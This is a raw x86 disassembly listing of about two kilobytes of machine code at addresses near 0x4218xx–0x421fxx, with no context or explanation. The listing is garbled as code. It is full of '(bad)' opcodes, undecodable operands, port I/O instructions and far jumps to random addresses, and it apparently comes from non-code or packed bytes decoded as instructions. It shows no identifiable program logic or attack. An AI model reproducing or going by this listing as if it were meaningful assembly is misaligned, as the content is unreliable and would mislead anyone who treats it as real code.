  421811:	sub    al,0x6c
  421813:	ins    DWORD PTR es:[edi],dx
  421814:	add    edx,DWORD PTR [edi+0x63]
  421817:	cmc    
  421818:	fwait
  421819:	repnz arpl WORD PTR [edi+eiz*8+0x42],di
  42181e:	jecxz  0x4217f6
  421820:	outs   dx,BYTE PTR ds:[esi]
  421821:	mov    ebp,0xda3e3584
  421826:	mov    al,0x37
  421828:	xor    BYTE PTR [ecx+0x6e],ah
  42182b:	in     eax,dx
  42182c:	mov    dl,0xe4
  42182f:	adc    eax,DWORD PTR [esi]
  421831:	cmp    al,0x20
  421833:	sbb    DWORD PTR [ebx-0xe],edx
  421836:	lds    eax,FWORD PTR [esi+eax*8+0x17]
  42183a:	pop    ss
  42183b:	sahf   
  42183c:	(bad)  
  42183d:	int    0x88
  42183f:	not    BYTE PTR [ebp-0x5e]
  421842:	mov    WORD PTR [edi],cs
  421844:	mov    dh,0x6d
  421846:	sbb    ebp,ebp
  421848:	mov    ?,WORD PTR [edx]
  42184a:	jge    0x421894
  42184c:	mov    esi,0xadf288e6
  421851:	or     ebp,DWORD PTR [ebx-0x5f]
  421854:	jne    0x421843
  421856:	xchg   DWORD PTR [eax+edx*2],ecx
  421859:	xor    eax,0x43315f87
  42185e:	xor    al,0x6d
  421860:	pop    ss
  421861:	xchg   esi,eax
  421862:	ins    DWORD PTR es:[edi],dx
  421863:	add    eax,0x7969de65
  421868:	push   ecx
  421869:	sub    DWORD PTR [esi+0x616dd4e7],esi
  42186f:	mov    eax,ds:0x3d9e97e3
  421874:	dec    eax
  421875:	out    dx,eax
  421876:	adc    al,0xfb
  421878:	outs   dx,BYTE PTR ds:[esi]
  421879:	xor    al,0x16
  42187b:	jbe    0x42182e
  42187d:	push   cs
  42187e:	call   0x9123ebba
  421883:	into   
  421884:	xor    DWORD PTR [esi-0x59e925fd],0xa985988a
  42188e:	jge    0x4218dc
  421890:	mov    WORD PTR [edx],cs
  421892:	or     al,0x0
  421894:	fcmovnbe st,st(6)
  421896:	aam    0xdd
  421898:	or     bh,al
  42189a:	(bad)  [eax+0x17]
  42189d:	ins    DWORD PTR es:[edi],dx
  42189e:	pop    ss
  42189f:	lds    edi,FWORD PTR [ecx-0x4014068e]
  4218a5:	jl     0x4218a2
  4218a7:	ins    DWORD PTR es:[edi],dx
  4218a8:	mov    bh,0x85
  4218aa:	and    BYTE PTR es:[edx],0x4
  4218ae:	or     al,0xb3
  4218b0:	and    al,0x52
  4218b2:	gs mov al,0x4d
  4218b5:	shl    BYTE PTR [esi-0x5f],1
  4218b8:	dec    ebp
  4218b9:	cs jle 0x4218c2
  4218bc:	cwde   
  4218bd:	sbb    DWORD PTR [ebx+0x6fcadbf8],ebp
  4218c3:	sbb    esp,esp
  4218c5:	add    ah,BYTE PTR [ebp-0x43]
  4218c8:	pop    ds
  4218c9:	add    BYTE PTR [eax+0xf],cl
  4218cc:	jge    0x4218d6
  4218ce:	(bad)  
  4218cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4218d0:	ins    DWORD PTR es:[edi],dx
  4218d1:	inc    ebx
  4218d2:	jo     0x42188d
  4218d4:	shr    DWORD PTR [ebx+edx*4],1
  4218d7:	jnp    0x42192c
  4218d9:	adc    al,0x2f
  4218db:	pop    ebx
  4218dc:	mov    ebx,0xc890b695
  4218e1:	xchg   esp,eax
  4218e2:	xor    BYTE PTR ds:0x32684f4a,0xea
  4218e9:	mov    ebx,0x280b5b6d
  4218ee:	leave  
  4218ef:	loop   0x4218b3
  4218f1:	(bad)  
  4218f2:	shl    edx,1
  4218f4:	mov    esp,0xdba55647
  4218f9:	ret    0x9046
  4218fc:	enter  0xae3d,0x23
  421900:	rcr    DWORD PTR [edx+0xe],0xa9
  421904:	ins    DWORD PTR es:[edi],dx
  421905:	dec    ebp
  421906:	dec    ebx
  421907:	enter  0x35fe,0x92
  42190b:	gs xchg ebx,eax
  42190d:	mov    eax,ds:0x85c7d265
  421912:	ins    DWORD PTR es:[edi],dx
  421913:	inc    ebp
  421914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421915:	adc    al,0x8b
  421917:	jmp    0x4218b2
  421919:	jmp    0xc28d:0x12850b9b
  421920:	mov    cl,0x40
  421922:	loopne 0x4218fa
  421924:	call   0xc86d:0xb7443629
  42192b:	call   0xad79e59
  421930:	mov    BYTE PTR [ebp-0x4f523d5b],al
  421936:	jno    0x421937
  421938:	dec    di
  42193a:	mov    ecx,esp
  42193c:	and    eax,0x805b5b6d
  421941:	arpl   WORD PTR [ebx+ecx*8-0x2],sp
  421945:	xor    bh,BYTE PTR [ebx-0x2917ded6]
  42194b:	mov    eax,0x4e1f26b1
  421950:	adc    DWORD PTR [ebp-0x7fc7eb85],ecx
  421956:	lods   eax,DWORD PTR ds:[esi]
  421957:	fstp   st(2)
  421959:	mov    ?,WORD PTR [esi+edx*8+0x5968e68c]
  421960:	jmp    FWORD PTR [ebx-0x38]
  421963:	adc    al,0xdc
  421965:	fisub  DWORD PTR [ebp+0x7fe7cbe9]
  42196b:	pop    esp
  42196c:	lds    ebp,FWORD PTR [ecx-0x2496b9c7]
  421972:	jbe    0x4219dd
  421974:	sbb    bh,BYTE PTR [esi+0x44]
  421977:	jb     0x42198a
  421979:	sub    esi,DWORD PTR [edx]
  42197b:	stc    
  42197c:	rcl    BYTE PTR [esi-0x6f6b3913],1
  421982:	xor    BYTE PTR [ebx-0x38],dh
  421985:	mov    BYTE PTR [edx],bh
  421987:	pop    esp
  421988:	test   DWORD PTR [ebx],ecx
  42198a:	(bad)  [esi-0xb3a2790]
  421990:	out    0x46,al
  421992:	sbb    DWORD PTR [ecx],edi
  421994:	repnz dec edi
  421996:	inc    ebp
  421997:	sub    al,0x6d
  421999:	push   ecx
  42199a:	jb     0x421976
  42199c:	out    0x43,al
  42199e:	test   DWORD PTR ds:0xf8b8d83e,ecx
  4219a4:	in     eax,0x98
  4219a6:	mov    es,WORD PTR [eax-0x4bf86e5d]
  4219ac:	fstp   st(2)
  4219ae:	shl    bl,cl
  4219b0:	adc    ecx,ebp
  4219b2:	mov    bl,0x37
  4219b4:	ja     0x421a1e
  4219b6:	cmp    bl,bl
  4219b8:	inc    esi
  4219b9:	sbb    ebx,DWORD PTR [ebx+0x42]
  4219bc:	push   0x1402477
  4219c1:	cdq    
  4219c2:	mov    WORD PTR [edi],ss
  4219c4:	mov    BYTE PTR [esi],dl
  4219c6:	push   ss
  4219c7:	pop    esp
  4219c8:	xchg   esp,eax
  4219c9:	pop    ds
  4219ca:	xchg   BYTE PTR [eax-0x47a1a234],ah
  4219d0:	push   eax
  4219d1:	cli    
  4219d2:	fcom   QWORD PTR [eax-0x3]
  4219d5:	dec    esp
  4219d6:	sub    eax,DWORD PTR [eax]
  4219d8:	jg     0x421a4e
  4219da:	test   al,0x6a
  4219dc:	test   al,0x70
  4219de:	mov    ds:0xee6730a7,eax
  4219e3:	mov    ch,0x8f
  4219e5:	call   0x4d83:0xbadaab6
  4219ec:	inc    ecx
  4219ed:	fisttp WORD PTR [edx-0x64]
  4219f0:	add    eax,0x796da02d
  4219f5:	sti    
  4219f6:	jecxz  0x4219af
  4219f8:	and    eax,0x3
  4219fb:	pop    ebx
  4219fc:	int    0x36
  4219fe:	add    eax,edx
  421a00:	xchg   al,dl
  421a02:	dec    ebp
  421a03:	mov    al,0x75
  421a05:	mov    ds:0xcc5c2d92,eax
  421a0a:	mov    ?,WORD PTR [ebx-0x62]
  421a0d:	ja     0x4219a7
  421a0f:	fisubr DWORD PTR [ebp-0x4bb8f6ff]
  421a15:	cmp    al,0xbc
  421a17:	aaa    
  421a18:	fnsave [esi+0xd861c16]
  421a1e:	mov    esp,0xba412c07
  421a23:	sub    ch,BYTE PTR [ebx+0x2a]
  421a26:	ds mov al,0x74
  421a29:	or     ebp,DWORD PTR [eax-0x4962c42f]
  421a2f:	outs   dx,BYTE PTR ds:[esi]
  421a31:	sub    eax,0x20ab71a8
  421a36:	mov    ds:0x4ed5712f,al
  421a3b:	mov    ebx,0x509605a2
  421a40:	inc    esi
  421a41:	scas   al,BYTE PTR es:[edi]
  421a42:	cmp    BYTE PTR [ebx-0x20],bl
  421a45:	push   edi
  421a46:	ins    DWORD PTR es:[edi],dx
  421a47:	add    eax,ecx
  421a49:	push   ss
  421a4a:	dec    esi
  421a4b:	js     0x421aa9
  421a4d:	nop
  421a4e:	les    esp,FWORD PTR [ecx+0xb0ab6d]
  421a54:	or     ch,ch
  421a56:	jl     0x421abf
  421a58:	mov    cl,0x50
  421a5a:	and    esi,DWORD PTR [edx]
  421a5c:	adc    al,0xdb
  421a5e:	xchg   esi,eax
  421a5f:	int    0x14
  421a61:	xchg   eax,ebx
  421a63:	mov    bl,al
  421a65:	fisubr DWORD PTR [ebp+0x61]
  421a68:	or     DWORD PTR [ebx+eiz*8],ebx
  421a6b:	cwde   
  421a6c:	ficom  DWORD PTR [ecx+0x6edcc21a]
  421a72:	jne    0x421ab4
  421a74:	aaa    
  421a75:	sub    al,0xef
  421a77:	inc    edx
  421a78:	popf   
  421a79:	(bad)  
  421a7a:	cmp    ebx,ebp
  421a7c:	ins    DWORD PTR es:[edi],dx
  421a7d:	ret    0xd2c2
  421a80:	(bad)  
  421a81:	dec    ebp
  421a82:	inc    edi
  421a83:	cmp    al,0xad
  421a85:	jbe    0x421a4e
  421a87:	iret   
  421a88:	pop    ds
  421a89:	test   DWORD PTR [edx+0x6c],edx
  421a8c:	in     eax,dx
  421a8d:	into   
  421a8e:	sbb    ebx,edx
  421a90:	jno    0x421a3b
  421a92:	cs mov eax,0xd176142c
  421a98:	int    0x39
  421a9a:	and    BYTE PTR [edx-0x7bad6541],bl
  421aa0:	fistp  DWORD PTR [edx-0x26]
  421aa3:	dec    esp
  421aa4:	idiv   DWORD PTR [edx-0x75]
  421aa7:	mov    al,BYTE PTR es:[esi-0x4b]
  421aab:	mov    WORD PTR [esi+0xd],gs
  421aae:	test   al,0x71
  421ab0:	scas   eax,DWORD PTR es:[edi]
  421ab1:	sub    BYTE PTR [esi+ebp*8-0x22e99b41],al
  421ab8:	fiadd  DWORD PTR [esi-0x741b9a26]
  421abe:	scas   al,BYTE PTR es:[edi]
  421abf:	sbb    bh,BYTE PTR [esi]
  421ac1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421ac2:	push   ds
  421ac3:	mov    dl,0x82
  421ac5:	test   DWORD PTR ds:0xb5814aa2,ecx
  421acb:	dec    ecx
  421acc:	cwde   
  421acd:	jge    0x421aab
  421acf:	or     bh,BYTE PTR [ebx]
  421ad1:	or     bl,BYTE PTR [esi+0x11d2a0a2]
  421ad7:	mov    dh,0x6c
  421ad9:	or     ah,dl
  421adb:	pop    eax
  421adc:	mov    eax,0x1a200a6d
  421ae1:	test   al,0xcf
  421ae3:	dec    edi
  421ae4:	test   eax,0xc2c6e0c6
  421ae9:	mov    dh,0xdd
  421aeb:	bound  esp,QWORD PTR [edi-0x6ac80a3]
  421af1:	pop    eax
  421af2:	(bad)  
  421af3:	pop    ebx
  421af4:	lods   eax,DWORD PTR ds:[esi]
  421af5:	mov    ds:0xfc75d289,al
  421afa:	pop    ds
  421afb:	pop    ebx
  421afc:	rol    DWORD PTR [edi],0x6e
  421aff:	dec    ebx
  421b00:	jmp    0xf7a63b64
  421b05:	push   edi
  421b06:	pop    edi
  421b07:	retf   
  421b08:	sbb    DWORD PTR [ebx],0x495c175b
  421b0e:	sbb    DWORD PTR [ebx-0x45c13f00],0x6d
  421b15:	fcmovnu st,st(2)
  421b17:	in     eax,dx
  421b18:	mov    esi,0x2d747e9
  421b1d:	mov    eax,ds:0x2c68114a
  421b22:	ss mov dh,0x36
  421b25:	fisubr DWORD PTR [ebp-0x18]
  421b28:	mov    eax,esi
  421b2a:	daa    
  421b2b:	lods   al,BYTE PTR ds:[esi]
  421b2c:	mov    dl,0x4b
  421b2e:	jb     0x421b0b
  421b30:	add    eax,0x3725b636
  421b35:	repz sbb eax,0x383635ae
  421b3b:	inc    esp
  421b3c:	and    eax,0x536d5708
  421b41:	retf   
  421b42:	out    dx,al
  421b43:	or     eax,0x8585da17
  421b48:	dec    ebx
  421b49:	call   0xc36c85ee
  421b4e:	inc    ecx
  421b4f:	adc    edi,DWORD PTR [edx]
  421b51:	ficom  WORD PTR [ecx+eiz*1+0x28]
  421b55:	ins    BYTE PTR es:[edi],dx
  421b56:	clc    
  421b57:	adc    DWORD PTR [eax-0x48eae31a],ecx
  421b5d:	pop    edx
  421b5e:	ins    BYTE PTR es:[edi],dx
  421b5f:	xchg   ecx,eax
  421b60:	jge    0x421b1c
  421b62:	jp     0x421bbf
  421b64:	stos   BYTE PTR es:[edi],al
  421b65:	push   ss
  421b66:	and    al,BYTE PTR ds:0xe33da2b3
  421b6c:	lods   eax,DWORD PTR ds:[esi]
  421b6d:	mov    al,0xfd
  421b6f:	push   0x71b80ddc
  421b74:	adc    DWORD PTR [ecx+ebp*4+0x17],esi
  421b78:	or     ecx,DWORD PTR ds:0x1d91db40
  421b7e:	clc    
  421b7f:	(bad)  
  421b80:	jge    0x421b10
  421b82:	and    bl,cl
  421b84:	inc    esi
  421b85:	mov    ebx,0x55d76db1
  421b8a:	push   cs
  421b8b:	aad    0xea
  421b8d:	lea    esi,[esi+edi*8]
  421b90:	add    WORD PTR [ebx],cx
  421b93:	adc    al,0xdb
  421b95:	jmp    0x9d0dedb
  421b9a:	lods   eax,DWORD PTR ds:[esi]
  421b9b:	adc    DWORD PTR [ebp+0x1201dc4d],esi
  421ba1:	or     BYTE PTR [ebx],al
  421ba3:	xchg   edx,eax
  421ba4:	fstp   QWORD PTR [edx-0x28]
  421ba7:	fimul  DWORD PTR [edx-0x1cad3fb]
  421bad:	loop   0x421b9c
  421baf:	xor    DWORD PTR [edx+esi*2+0x78ab6b6d],ebx
  421bb6:	fcom   DWORD PTR fs:[esi+0x4b05ee94]
  421bbd:	mov    bh,0xda
  421bbf:	ror    BYTE PTR ds:0xfb0bef8e,cl
  421bc5:	jg     0x421c43
  421bc7:	neg    BYTE PTR [ecx-0x1f]
  421bca:	out    dx,eax
  421bcb:	(bad)  
  421bcc:	ss push ecx
  421bce:	mov    DWORD PTR cs:[esi+0x3ba5e69b],edi
  421bd5:	sbb    bl,ch
  421bd7:	mov    dh,0x8d
  421bd9:	ret    0x898a
  421bdc:	(bad)  
  421bdd:	daa    
  421bde:	sub    bh,dl
  421be0:	aaa    
  421be1:	or     BYTE PTR [ecx+0x2942eb20],ah
  421be7:	mov    ds:0x4879097a,al
  421bec:	neg    DWORD PTR [esi-0x26]
  421bef:	test   al,0x8d
  421bf1:	test   BYTE PTR [eax+0x669c745b],0x1b
  421bf8:	dec    eax
  421bf9:	fild   DWORD PTR [eax+esi*4]
  421bfc:	mov    eax,ds:0xf571fcc8
  421c01:	cli    
  421c02:	daa    
  421c03:	and    esp,eax
  421c05:	(bad)  
  421c06:	mov    dh,0x6d
  421c08:	icebp  
  421c09:	stos   BYTE PTR es:[edi],al
  421c0a:	imul   ebx,DWORD PTR [ecx+0x61],0x80d45f4d
  421c11:	mov    ds:0x2489b1b4,eax
  421c16:	cmp    ch,BYTE PTR [edx+0x66dab709]
  421c1c:	fld    TBYTE PTR [edx-0x25]
  421c1f:	ins    DWORD PTR es:[edi],dx
  421c20:	neg    BYTE PTR [edi-0x10]
  421c23:	loopne 0x421c7b
  421c25:	shl    DWORD PTR [eax+0x37e02576],1
  421c2b:	xchg   esi,eax
  421c2c:	pusha  
  421c2d:	popa   
  421c2e:	or     DWORD PTR [edx+edi*2-0x5f],edi
  421c32:	or     BYTE PTR [ebp+0x51ad00b3],0x2e
  421c39:	xchg   esi,eax
  421c3a:	inc    eax
  421c3b:	sbb    al,BYTE PTR [ebp+0x5d]
  421c3e:	pop    edi
  421c3f:	mov    cl,0x6d
  421c41:	mov    bh,0xb6
  421c43:	inc    esp
  421c44:	or     BYTE PTR [eax],bh
  421c46:	sub    BYTE PTR [edx-0x67],dl
  421c49:	and    BYTE PTR [ebp-0x2ff8509b],bh
  421c4f:	lea    ebp,[ebp+0x21062ccf]
  421c55:	jbe    0x421c0c
  421c57:	popa   
  421c58:	mov    dh,0x5b
  421c5a:	or     ebp,DWORD PTR [ebp+0x34]
  421c5d:	mov    ecx,0xbe224c4d
  421c62:	adc    esi,ebp
  421c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421c65:	push   ebx
  421c66:	sbb    edx,0xdf8f221a
  421c6c:	aam    0xec
  421c6e:	xchg   DWORD PTR [ebp+0x19575a05],ecx
  421c74:	adc    edx,ebx
  421c76:	adc    dh,ch
  421c78:	xor    BYTE PTR ds:0xc1b63711,cl
  421c7e:	cwde   
  421c7f:	out    dx,al
  421c80:	xor    esi,DWORD PTR [edx-0x752cf7f3]
  421c86:	fsubr  DWORD PTR [esi+0x1b]
  421c89:	data16 shl BYTE PTR [ebx+0x780245db],1
  421c90:	fcom   DWORD PTR [esi]
  421c92:	push   0x6b
  421c94:	(bad)  
  421c95:	retf   0xc7c2
  421c98:	ins    DWORD PTR es:[edi],dx
  421c99:	das    
  421c9a:	jno    0x421c62
  421c9c:	sub    eax,0x495b6d6c
  421ca1:	sbb    al,0x14
  421ca3:	stc    
  421ca4:	out    dx,eax
  421ca5:	dec    edx
  421ca6:	jno    0x421d27
  421ca8:	pop    edi
  421ca9:	fcmovb st,st(2)
  421cab:	mov    dh,0x40
  421cad:	lock stos DWORD PTR es:[edi],eax
  421caf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421cb0:	xchg   edi,eax
  421cb1:	jae    0x421cb2
  421cb3:	sbb    al,bh
  421cb5:	ins    DWORD PTR es:[edi],dx
  421cb6:	fist   DWORD PTR [esi]
  421cb8:	mov    eax,0x74037721
  421cbd:	retf   
  421cbe:	adc    ebp,edi
  421cc0:	inc    edx
  421cc1:	dec    ebx
  421cc2:	stos   DWORD PTR es:[edi],eax
  421cc3:	inc    esp
  421cc4:	(bad)  
  421cc5:	fild   DWORD PTR [esi]
  421cc7:	xor    eax,0x606062ed
  421ccc:	or     dl,BYTE PTR [ebx-0x3f]
  421ccf:	ins    DWORD PTR es:[edi],dx
  421cd0:	popa   
  421cd1:	bound  esi,QWORD PTR [eax+0x6e]
  421cd4:	adc    DWORD PTR ds:[ebx+0xb],ecx
  421cd8:	je     0x421d1a
  421cda:	pop    ebx
  421cdb:	push   esp
  421cdc:	xchg   esp,eax
  421cdd:	loope  0x421ce4
  421cdf:	adc    ebx,DWORD PTR [edi+0xbe585c5]
  421ce5:	jo     0x84f51cf1
  421ceb:	pop    eax
  421cec:	xchg   edx,eax
  421ced:	cmp    eax,0x5d5b6cb8
  421cf2:	imul   al
  421cf4:	mov    ss,WORD PTR cs:[edx+0x6b13dea0]
  421cfb:	mov    ds:0x58675a58,al
  421d00:	sub    al,0x6b
  421d02:	cwde   
  421d03:	imul   eax,DWORD PTR [edx],0x6db636dd
  421d09:	mov    ecx,0x646ef94d
  421d0e:	jle    0x421cf3
  421d10:	xor    bh,BYTE PTR [edx+0x4]
  421d13:	mov    eax,0x29a0ead0
  421d18:	push   ebx
  421d19:	lahf   
  421d1a:	jns    0x421d68
  421d1c:	dec    eax
  421d1d:	out    0xb7,eax
  421d1f:	ins    DWORD PTR es:[edi],dx
  421d20:	test   eax,0xe01cf123
  421d25:	rol    DWORD PTR ds:0xd678683d,1
  421d2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421d2c:	stos   BYTE PTR es:[edi],al
  421d2d:	jo     0x421d9a
  421d2f:	sbb    eax,0x13dd569b
  421d34:	test   al,0x8b
  421d36:	mov    edx,0x70d8adfc
  421d3b:	test   BYTE PTR [eax],0x59
  421d3e:	aad    0x0
  421d40:	inc    esi
  421d41:	pop    esp
  421d42:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421d43:	(bad)  ds:0xb4a1ad6e
  421d49:	jg     0x421d06
  421d4b:	out    0xfe,al
  421d4d:	int    0x5c
  421d4f:	sbb    dl,bl
  421d51:	adc    BYTE PTR [edx-0x4c],0x7d
  421d55:	mov    edi,0x106ab8e0
  421d5a:	(bad)  [eax-0x61]
  421d5d:	or     al,0x58
  421d5f:	ins    BYTE PTR es:[edi],dx
  421d60:	(bad)
  421d63:	sub    ch,BYTE PTR [esi]
  421d65:	call   0x112dee20
  421d6a:	xchg   ecx,eax
  421d6b:	mov    al,ch
  421d6d:	jbe    0x421cf6
  421d6f:	and    BYTE PTR [ebp+0x17],ch
  421d72:	mov    dh,0xd6
  421d74:	rdtsc  
  421d76:	call   0xe6cd20e9
  421d7b:	test   DWORD PTR [edi-0x42],ebx
  421d7e:	pop    ss
  421d7f:	fidiv  DWORD PTR [esi-0x7249f294]
  421d85:	lds    ecx,FWORD PTR [eax-0x6b057d50]
  421d8b:	imul   ebp,DWORD PTR [ecx-0x25],0x1a
  421d8f:	repz pop DWORD PTR [edx]
  421d92:	cmp    BYTE PTR [edi],dl
  421d94:	adc    edi,eax
  421d96:	xor    al,0x1f
  421d98:	fstp   st(2)
  421d9a:	ins    DWORD PTR es:[edi],dx
  421d9b:	ja     0x421d3e
  421d9d:	xor    BYTE PTR [ecx-0x2e62dcf2],dh
  421da3:	fstp   DWORD PTR [eax+edx*2]
  421da6:	popa   
  421da7:	fld    TBYTE PTR [esi-0x7d]
  421daa:	dec    esp
  421dab:	sti    
  421dac:	xor    eax,0x169302d2
  421db1:	popa   
  421db2:	arpl   WORD PTR [ebx+0x585ee3d0],bp
  421db8:	call   0xb6dd:0x1cb66db
  421dbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421dc0:	jbe    0x421d87
  421dc2:	js     0x421dcc
  421dc4:	xor    eax,0x8d59b52
  421dc9:	in     al,0x7e
  421dcb:	outs   dx,BYTE PTR ds:[esi]
  421dcc:	sbb    ecx,DWORD PTR [esi+0x7402f2b6]
  421dd2:	pushf  
  421dd3:	iret   
  421dd4:	scas   eax,DWORD PTR es:[edi]
  421dd5:	imul   esi,DWORD PTR [eax-0x48eff2f0],0xffffffaf
  421ddc:	cwde   
  421ddd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421dde:	add    dl,BYTE PTR [ebp+eax*1+0xe08b00]
  421de5:	outs   dx,BYTE PTR ds:[esi]
  421de6:	or     ecx,DWORD PTR [edx]
  421de8:	hlt    
  421de9:	adc    DWORD PTR [ecx-0x14],ecx
  421dec:	push   cs
  421ded:	mov    eax,ds:0xb55b1b01
  421df2:	mov    ebp,0x8e3fe230
  421df7:	fist   DWORD PTR [esi+0x19df6168]
  421dfd:	aam    0xcc
  421dff:	ja     0x421e48
  421e01:	sbb    ch,BYTE PTR [ebp+0x6342c2ed]
  421e07:	arpl   WORD PTR [ebx-0x1b],cx
  421e0a:	cmp    ebp,DWORD PTR [eax]
  421e0c:	cmp    al,0xa7
  421e0e:	push   ebx
  421e0f:	test   DWORD PTR [ebp+0x1926eab],ebp
  421e15:	imul   eax,DWORD PTR [ebx+0x56],0x2f
  421e19:	jecxz  0x421dee
  421e1b:	retf   
  421e1c:	xchg   ebp,eax
  421e1d:	(bad)  [esi-0x340ae5f9]
  421e23:	hlt    
  421e24:	xlat   BYTE PTR ds:[ebx]
  421e25:	pop    edi
  421e26:	jbe    0x421dfe
  421e28:	inc    esp
  421e29:	jno    0x421e8e
  421e2b:	jmp    0x5697:0x9859ed00
  421e32:	loopne 0x421e06
  421e34:	rol    dh,cl
  421e36:	nop
  421e37:	loope  0x421e12
  421e39:	(bad)  [edx-0x77]
  421e3c:	sti    
  421e3d:	mov    edi,0xe85b70b
  421e42:	cmc    
  421e43:	loope  0x421e52
  421e45:	push   ecx
  421e46:	push   cs
  421e47:	xchg   ecx,eax
  421e48:	pusha  
  421e49:	jl     0x421e5d
  421e4b:	inc    edx
  421e4c:	mov    ebx,0x86655435
  421e51:	sub    al,0x94
  421e53:	sbb    eax,0xbb171fc8
  421e58:	stos   BYTE PTR es:[edi],al
  421e59:	in     eax,dx
  421e5a:	rcl    DWORD PTR [edi],1
  421e5c:	mov    dh,0x2d
  421e5e:	(bad)  
  421e5f:	pushf  
  421e60:	and    DWORD PTR [ecx],esp
  421e62:	pop    edx
  421e63:	pusha  
  421e64:	imul   eax,eax,0x7b
  421e67:	(bad)  
  421e68:	pop    edx
  421e6a:	push   ds
  421e6b:	pop    edx
  421e6c:	mov    al,0x89
  421e6e:	bound  ebp,QWORD PTR [ebx+0x68]
  421e71:	jmp    0x13e4:0x6d71bc80
  421e78:	in     eax,dx
  421e79:	inc    esi
  421e7a:	pop    es
  421e7b:	and    BYTE PTR [esi],ah
  421e7d:	add    BYTE PTR [ebx],dh
  421e7f:	pushf  
  421e80:	jp     0x421e7f
  421e82:	lds    eax,FWORD PTR [edx+0x35]
  421e85:	or     BYTE PTR [ebx-0x64fe6f27],dl
  421e8b:	bound  eax,QWORD PTR [edi]
  421e8d:	imul   esi,DWORD PTR [edi+eax*1]
  421e91:	adc    al,0xc6
  421e93:	(bad)  
  421e94:	mov    dh,0xb1
  421e96:	aad    0xc3
  421e98:	ss xor al,0x2a
  421e9b:	jnp    0x421ed2
  421e9d:	fwait
  421e9e:	das    
  421e9f:	daa    
  421ea0:	or     edx,DWORD PTR [eax]
  421ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ea3:	loop   0x421e6f
  421ea5:	in     al,0x13
  421ea7:	or     DWORD PTR [esi-0x4a],edi
  421eaa:	pop    ebx
  421eab:	fild   DWORD PTR [esi+0x79]
  421eae:	cdq    
  421eaf:	das    
  421eb0:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  421eb2:	pop    ebx
  421eb3:	cdq    
  421eb4:	push   ebx
  421eb5:	lock ins DWORD PTR es:[edi],dx
  421eb7:	mov    ebx,0xc8bb15b4
  421ebc:	push   ecx
  421ebd:	cmp    ebx,DWORD PTR [edx-0x185a674]
  421ec3:	mov    dh,0xb
  421ec5:	ins    DWORD PTR es:[edi],dx
  421ec6:	adc    DWORD PTR [ecx+0x74],0x38
  421eca:	stos   BYTE PTR es:[edi],al
  421ecb:	mov    ch,al
  421ecd:	add    esi,DWORD PTR [ebp+ebx*2-0x4a]
  421ed1:	pop    ebp
  421ed2:	push   0x2e9aeaa0
  421ed7:	mov    WORD PTR [ebp-0x65],fs
  421eda:	push   es
  421edb:	shl    DWORD PTR [esi-0x7f24948b],1
  421ee1:	dec    edx
  421ee2:	aas    
  421ee3:	sbb    eax,0xe854dfcb
  421ee8:	xchg   edi,eax
  421ee9:	inc    edi
  421eea:	aam    0xb6
  421eec:	add    dl,0x56
  421eef:	sar    edi,0xf5
  421ef2:	inc    ecx
  421ef3:	pop    ebx
  421ef4:	jmp    0x421eac
  421ef6:	mov    ch,0x26
  421ef8:	addr16 dec esp
  421efa:	add    eax,0x22c57e5c
  421eff:	mov    DWORD PTR [edx+0x4bb5b0b6],esi
  421f05:	fwait
  421f06:	fs (bad) 
  421f08:	pop    ecx
  421f09:	into   
  421f0a:	and    eax,DWORD PTR [ecx]
  421f0c:	xor    dl,BYTE PTR [edi]
  421f0e:	test   DWORD PTR [ebp-0x2cb1f72],ebp
  421f14:	or     bh,BYTE PTR [edi+0x61]
  421f17:	dec    di
  421f19:	mov    DWORD PTR [edx-0x7cb694bf],edi
  421f1f:	jmp    0xadc47dfa
  421f24:	lods   eax,DWORD PTR ds:[esi]
  421f25:	ins    DWORD PTR es:[edi],dx
  421f26:	mov    ds:0xfb159ce9,eax
  421f2b:	lea    edx,[ebx]
  421f2d:	cwde   
  421f2e:	sub    edi,DWORD PTR [eax-0x745fca4c]
  421f34:	(bad)  
  421f35:	sbb    esp,DWORD PTR [edi+0x2b3cef86]
  421f3b:	pop    ss
  421f3c:	call   0x9fe00c69
  421f41:	pop    esi
  421f42:	xor    cl,BYTE PTR [ebx]
  421f44:	or     al,0xd5
  421f46:	mov    dl,0x74
  421f48:	lds    edi,FWORD PTR [esi-0x7d]
  421f4b:	fs and al,0x26
  421f4e:	push   edi
  421f4f:	jno    0x421f2c
  421f51:	add    BYTE PTR [eax-0x2d],ch
  421f54:	fst    QWORD PTR [esi+0x52]
  421f57:	xor    edx,DWORD PTR [ebp+0x6356db8d]
  421f5d:	fbstp  TBYTE PTR [esi+0x7a]
  421f60:	sbb    eax,0x35ce42d8
  421f65:	ss pop esp
  421f67:	push   ecx
  421f68:	mov    dh,0x0
  421f6a:	fldcw  WORD PTR [eax-0x4e44ae4a]
  421f70:	mov    bl,0x10
  421f72:	push   esp
  421f73:	mov    ecx,0xf3524147
  421f78:	adc    al,0x6d
  421f7a:	add    ebx,DWORD PTR [edx]
  421f7c:	shr    DWORD PTR [esi-0xa],1
  421f7f:	cmp    ax,0xb783
  421f83:	test   DWORD PTR [esi+0x23213b8a],eax
  421f89:	adc    ecx,ebp
  421f8b:	fcmovbe st,st(0)
  421f8d:	adc    ch,BYTE PTR [ebx-0x77]
  421f90:	jb     0x421f92
  421f92:	imul   esi,edi,0xffffffcb
  421f95:	popf   
  421f96:	call   0x1aa2a51b
  421f9b:	imul   esp,esi,0x51
  421f9e:	xchg   DWORD PTR [edx-0x5e],ebx
  421fa1:	fstp   st(0)
  421fa3:	aad    0xe7
  421fa5:	pop    ebp
  421fa6:	mov    eax,0x5d4c2328
  421fab:	ret    0x42d2
  421fae:	jmp    0x421f6e
  421fb0:	and    ah,BYTE PTR [ebx]
  421fb2:	adc    eax,DWORD PTR [ebx-0x2547267d]
  421fb8:	inc    esi
  421fb9:	ins    BYTE PTR es:[edi],dx
  421fba:	fcmovne st,st(1)
  421fbc:	jp     0x421f64
  421fbe:	push   esi
  421fbf:	dec    ebp
